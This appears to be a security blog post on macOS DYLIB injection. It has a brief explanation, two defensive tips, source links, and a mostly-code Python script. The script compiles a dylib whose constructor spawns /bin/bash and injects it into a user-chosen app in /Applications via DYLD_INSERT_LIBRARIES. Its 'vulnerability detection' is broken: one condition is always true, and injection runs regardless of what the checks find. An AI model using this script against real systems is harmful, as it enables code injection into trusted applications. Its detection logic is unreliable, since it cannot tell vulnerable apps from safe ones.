---
layout: attack
title: Detecting and Exploiting App Vulnerabilities with DYLIB Injection
---

<img height="150" align="left" src="/images/dylib_injection.jpg" > A short intro into DYLIB injection, a technique that attackers can use to compromise MacOS applications. The presented script tries in an automated way to find vulnerable apps and exploit over dylib injection if possible. The script itself is not entirely hardened against errors and very likely will be busted by EDRs solutions based on the nature of this script. Also this is meant to be used for educational purposes only.


## What is DYLIB Injection?

DYLIB (Dynamic Linked Library) injection is a method where malicious code is loaded into a legitimate application at runtime. This allows attackers to manipulate the app's behavior, steal data, or even gain complete control of the system.

## Protecting Yourself from DYLIB Injection

While the script demonstrates how attackers might exploit vulnerabilities, it also highlights areas for defense:

* __Application Sandboxing__: Many applications on macOS run in sandboxes, limiting their access to system resources and making them less susceptible to injection attacks.
* __Code Signing__: Apple's code-signing process helps ensure application integrity. Be wary of applications that fail signature verification.


## Some sources:
* [HackTricks MacOS Lib Injection](https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection)
* [HackTricks - Macos Dyld Hijacking and Insert Libs](https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries)
* [Malware Unicorn - Dylib Injection](https://malwareunicorn.org/workshops/macos_dylib_injection.html#0)

## The code
```python
import os
import subprocess

def enumerate_installed_apps():
    applications = [f"[{idx + 1}] {app}" for idx, app in enumerate(os.listdir('/Applications')) if app.endswith('.app')]
    print("\n".join(applications))
    return [app.split("] ")[1] for app in applications]

def verify_app_integrity(app):
    """
    Checks an application for integrity by verifying its signature.
    Returns True if the application might have been modified or if an error occurs.
    """
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        result = subprocess.run(['codesign', '-vvv', '--deep', '--strict', app_path], capture_output=True, text=True)
        if 'valid on disk' in result.stdout and 'satisfies its Designated Requirement' in result.stdout:
            print(f"> {app} appears to be intact and not modified.")
        else:
            print(f"> WARNING: {app} may have been modified.")
            print(result.stdout)
            return True
    except Exception as e:
        print(f"> ERROR checking {app}: {e}")
        return True  

    return False

def detect_weak_dylibs(app):
    """
    Checks if an application has loaded weak dynamic libraries (dylibs).
    Returns True if weak dylibs were found.
    """
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        result = subprocess.run(['otool', '-l', app_path], capture_output=True, text=True)
        if 'LC_LOAD_WEAK_DYLIB' in result.stdout:
            print(f"> {app} has weak dylibs loaded.")
            return True
        else:
            print(f"> {app} does not have weak dylibs loaded.")
    except Exception as e:
        print(f"> ERROR checking weak dylibs for {app}: {e}")
        return True

    return False

def build_dylib():
    """
    Compiles a dynamic library (dylib) that can later be injected into an application.
    
    Origin/Sources:
    https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection
    https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries
    https://malwareunicorn.org/workshops/macos_dylib_injection.html#0
    """
    c_code = """
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\\n", argv[0]);
    printf("[+] dylib injected in %s\\n", argv[0]);
    execv("/bin/bash", 0);
}
"""
    with open("inject.c", "w") as file:
        file.write(c_code)
    subprocess.run(['gcc', '-dynamiclib', '-o', 'inject.dylib', 'inject.c'], check=True)
    print("> Dylib compiled successfully.")

def perform_dylib_injection(app):
    """
    Attempts to inject a previously compiled dynamic library into an application.
    """
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        os.environ['DYLD_INSERT_LIBRARIES'] = 'inject.dylib'
        subprocess.run([app_path], check=True)
    except Exception as e:
        print(f"> ERROR injecting {app}: {e}")

def main():
    applications = enumerate_installed_apps()
    app_number = int(input("Enter the number of the software you want to attempt the injection on: ")) - 1
    selected_app = applications[app_number]
    
    print(f"> Checking for vulnerabilities in {selected_app}...")
    if verify_app_integrity(selected_app) or not verify_app_integrity(selected_app):
        if detect_weak_dylibs(selected_app):
            build_dylib()
            perform_dylib_injection(selected_app)
        else:
            print(f"> {selected_app} does not have weak dylibs loaded, but attempting injection anyway.")
            build_dylib()
            perform_dylib_injection(selected_app)
    else:
        print(f"> {selected_app} is not vulnerable to dylib injection.")

if __name__ == "__main__":
    main()
```
